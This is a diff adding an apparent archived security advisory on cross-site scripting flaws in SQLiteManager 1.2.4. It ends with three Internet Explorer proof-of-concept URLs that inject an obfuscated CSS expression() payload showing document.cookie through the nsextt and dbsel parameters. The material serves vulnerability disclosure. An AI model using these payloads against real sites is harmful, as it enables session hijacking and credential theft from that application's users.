@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/51294/info
+ 
+SQLiteManager is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+ 
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+ 
+SQLiteManager 1.2.4 is vulnerable; other versions may also be affected. 
+
+IE-only
+http://www.example.com/sqlite/?nsextt=" stYle="x:expre/**/ssion(alert(document.cookie))
+http://www.example.com/sqlite/index.php?dbsel=" stYle="x:expre/**/ssion(alert(document.cookie))
+http://www.example.com/sqlite/index.php?nsextt=" stYle="x:expre/**/ssion(alert(document.cookie))
